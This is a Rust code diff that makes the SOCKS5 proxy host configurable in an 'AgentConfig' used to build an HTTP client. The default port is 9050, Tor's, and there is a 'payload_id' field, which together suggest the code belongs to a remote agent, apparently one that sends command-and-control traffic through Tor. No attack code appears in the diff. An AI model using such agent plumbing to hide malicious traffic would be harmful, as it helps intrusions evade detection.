@@ -18,8 +18,14 @@ pub struct AgentConfig {
     pub protocol: String,
     #[serde(default)]
     pub socks5_enabled: bool,
+    #[serde(default = "default_socks5_host")]
+    pub socks5_host: String,
     #[serde(default = "default_socks5_port")]
     pub socks5_port: u16,
+}
+
+fn default_socks5_host() -> String {
+    "127.0.0.1".to_string()
 }
 
 fn default_socks5_port() -> u16 {
@@ -35,6 +41,7 @@ impl Default for AgentConfig {
             payload_id: String::new(),
             protocol: String::from("http"),
             socks5_enabled: true,
+            socks5_host: String::from("127.0.0.1"),
             socks5_port: 9050,
         }
     }
@@ -83,7 +90,7 @@ impl AgentConfig {
     /// Build an HTTP client that respects the SOCKS5 proxy config and logs the proxy status.
     pub fn build_http_client(&self) -> Result<Client, io::Error> {
         if self.socks5_enabled {
-            let proxy_url = format!("socks5h://127.0.0.1:{}", self.socks5_port);
+            let proxy_url = format!("socks5h://{}:{}",self.socks5_host, self.socks5_port);
             info!("[HTTP] Building HTTP client with SOCKS5 proxy: {}", proxy_url);
             match Client::builder()
                 .proxy(Proxy::all(&proxy_url).map_err(|e| {
